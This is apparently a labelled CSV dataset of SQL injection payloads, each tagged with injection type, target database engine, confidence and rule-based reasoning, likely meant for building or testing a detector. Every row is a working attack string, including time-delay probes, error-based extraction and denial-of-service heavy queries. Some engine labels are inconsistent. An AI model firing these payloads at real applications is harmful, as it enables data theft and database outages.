id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18823,end and ( 'nchh' = 'nchh,boolean_blind,generic,0.85,'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | db_engine=generic,2
18824,"1"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""dplf"" like ""dplf",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18825,"1%' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",heavy_query,generic,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18826,"1 ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 6583 = 6583",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18827,"1"" ) ) as tybm where 2687 = 2687 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18828,"1'|| ( select 'ymwf' where 1229 = 1229 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18829,"1 ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.75,'sysusers x N' -> heavy_query (P4): Cartesian join of sysusers aliases for MSSQL heavy query | db_engine=mssql,1
18830,"1' in boolean mode ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18831,"1%' or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18832,select ( case when ( 8808 = 1367 ) then 1 else 8808* ( select 8808 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.9,'master..sysdatabases' -> boolean_blind (P3): master..sysdatabases used in CASE WHEN for MSSQL boolean blind | db_engine=mssql,3
18833,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 1105 = 1105",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18834,"1"" ) ) as dshc where 9911 = 9911 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18835,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""mubt"" = ""mubt",boolean_blind,db2,0.9,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",3
18836,"1' ) where 9544 = 9544 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.85,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18837,"1 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18838,"( select 1 from generate_series ( 9352,9352,case when ( 9352 = 9352 ) then 1 else 0 end ) limit 1 )",heavy_query,postgresql,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'generate_series(' -> heavy_query (P4): generate_series() in PostgreSQL builds heavy query | db_engine=postgresql,1
18839,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and 'obwn' = 'obwn,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18840,"1 and elt ( 1210 = 1210,sleep ( 5 ) ) -- ommf",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18841,"1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'xqkq' = 'xqkq",boolean_blind,firebird,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",3
18842,"end and ""mdje"" like ""mdje",boolean_blind,generic,0.85,"'""x"" LIKE ""x""' -> boolean_blind (P3): Double-quoted-string LIKE tautology for boolean blind | db_engine=generic",2
18843,"1'+ ( select inrv where 2178 = 2178 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",1
18844,"1%' or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18845,"1 ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18846,"1%' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( '%' = '",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18847,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",heavy_query,generic,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18848,select ( case when ( 5163 = 4861 ) then 1 else 5163* ( select 5163 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.9,'master..sysdatabases' -> boolean_blind (P3): master..sysdatabases used in CASE WHEN for MSSQL boolean blind | db_engine=mssql,3
18849,"1'|| ( select 'xsoq' from dual where 6690 = 6690 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'",heavy_query,oracle,0.75,'sysusers x N' -> heavy_query (P4): Cartesian join of sysusers aliases for MSSQL heavy query | db_engine=oracle,1
18850,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'tvcm' = 'tvcm",heavy_query,generic,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18851,"end and ( ""%"" = """,boolean_blind,generic,0.85,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | db_engine=generic",2
18852,"1"" ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""qblj"" like ""qblj",boolean_blind,generic,0.9,"'""x"" LIKE ""x""' -> boolean_blind (P3): Double-quoted-string LIKE tautology for boolean blind | 'sysusers x N' -> heavy_query (P4): Cartesian join of sysusers aliases for MSSQL heavy query | db_engine=generic",3
18853,"1%' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( '%' = '",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'extractvalue(' -> error_based (P4): extractvalue() triggers MySQL XPath error | db_engine=mysql,2
18854,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""cuzi"" like ""cuzi",heavy_query,generic,0.9,"'""x"" LIKE ""x""' -> boolean_blind (P3): Double-quoted-string LIKE tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18855,"1%' ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( '%' = '",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18856,"1"" ) where 6956 = 6956 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.8,"'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=db2",1
18857,"1%"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""%"" = """,boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18858,"1' or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18859,"1' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'wfws' = 'wfws",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18860,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'ylit' like 'ylit",heavy_query,generic,0.9,"''x' LIKE 'x'' -> boolean_blind (P3): Quoted-string LIKE tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18861,"1 ) as czeu where 1738 = 1738 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.85,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18862,"select * from generate_series ( 7407,7407,case when ( 7407 = 6562 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'generate_series(' -> heavy_query (P4): generate_series() in PostgreSQL builds heavy query | db_engine=postgresql,1
18863,"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'nvsy' like 'nvsy",heavy_query,oracle,0.8,''x' LIKE 'x'' -> boolean_blind (P3): Quoted-string LIKE tautology for boolean blind | 'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18864,"1"" where 8918 = 8918 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",heavy_query,generic,0.9,"'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18865,"1'|| ( select 'vsfg' where 3547 = 3547 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) ||'",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'updatexml(' -> error_based (P4): updatexml() triggers MySQL XPath error | db_engine=mysql,2
18866,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'rxdz' = 'rxdz",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18867,"select * from generate_series ( 9434,9434,case when ( 9434 = 3991 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'generate_series(' -> heavy_query (P4): generate_series() in PostgreSQL builds heavy query | db_engine=postgresql,1
18868,"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'tblb' = 'tblb",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'extractvalue(' -> error_based (P4): extractvalue() triggers MySQL XPath error | db_engine=mysql,2
18869,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'swjk' = 'swjk",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18870,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and 'kdxg' like 'kdxg",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18871,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'yfkk' = 'yfkk",heavy_query,oracle,0.8,'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18872,"1%' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18873,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'xaoi' = 'xaoi",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18874,"1%"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""%"" = """,boolean_blind,oracle,0.8,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'utl_inaddr' -> error_based (P4): utl_inaddr.get_host_address is Oracle error/OOB | db_engine=oracle",1
18875,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'updatexml(' -> error_based (P4): updatexml() triggers MySQL XPath error | db_engine=mysql,2
18876,"select * from generate_series ( 3990,3990,case when ( 3990 = 9597 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'generate_series(' -> heavy_query (P4): generate_series() in PostgreSQL builds heavy query | db_engine=postgresql,1
18877,"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'brlc' = 'brlc",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18878,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'yabn' = 'yabn",boolean_blind,firebird,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'count(*) from T t1,T t2,T t3' -> heavy_query (P4): count(*) over 3+ self-joined tables creates cartesian heavy query | db_engine=firebird",3
18879,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'opll' like 'opll",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
18880,"1"" ) as qjyu where 2679 = 2679 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.8,"'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",1
18881,"1%' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( '%' = '",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'updatexml(' -> error_based (P4): updatexml() triggers MySQL XPath error | db_engine=mysql,2
18882,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""vukd"" = ""vukd",heavy_query,generic,0.9,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18883,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""zcfa"" = ""zcfa",boolean_blind,firebird,0.9,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",3
18884,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'jjmt' = 'jjmt",heavy_query,oracle,0.8,'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18885,select ( case when ( 6839 = 2730 ) then 6839 else 6839* ( select 6839 from mysql.db ) end ) #,boolean_blind,generic,0.85,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | db_engine=generic,3
18886,"1%' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'extractvalue(' -> error_based (P4): extractvalue() triggers MySQL XPath error | db_engine=mysql,2
18887,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'sucj' = 'sucj",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18888,"select * from generate_series ( 3607,3607,case when ( 3607 = 4242 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.8,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'generate_series(' -> heavy_query (P4): generate_series() in PostgreSQL builds heavy query | db_engine=postgresql,1
18889,select ( case when ( 3681 = 5026 ) then 3681 else 3681* ( select 3681 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.85,'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | db_engine=mysql,3
18890,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'wweo' = 'wweo",heavy_query,oracle,0.8,'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18891,"1' in boolean mode ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18892,"end and ( ( ( ""poee"" = ""poee",boolean_blind,generic,0.85,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | db_engine=generic",2
18893,"1%"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18894,"1%' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18895,"1%' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",heavy_query,generic,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18896,"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'cdaq' like 'cdaq",boolean_blind,firebird,0.9,"''x' LIKE 'x'' -> boolean_blind (P3): Quoted-string LIKE tautology for boolean blind | 'rdb$fields,rdb$types' -> heavy_query (P4): Firebird heavy query joining rdb$fields and rdb$types | db_engine=firebird",3
18897,"1 ) where 2781 = 2781 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.8,'all_users t1..t5' -> heavy_query (P4): Cartesian join over all_users t1..t5 is Oracle heavy query | db_engine=oracle,1
18898,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18899,-8729'+ ( select 'nbzl' where 7160 = 7160 order by 1#,boolean_blind,generic,0.85,'order by N --/#' -> boolean_blind (P3): ORDER BY N with comment terminator is column-count probing for boolean blind | db_engine=generic,3
18900,"1%' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( '%' = '",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'UNION SELECT (x3)' -> union_based (P7): Detected 3 UNION SELECT clause(s) for data extraction | db_engine=mysql,2
18901,"1 ) ) as ynzg where 1926 = 1926 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.85,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | db_engine=mysql,2
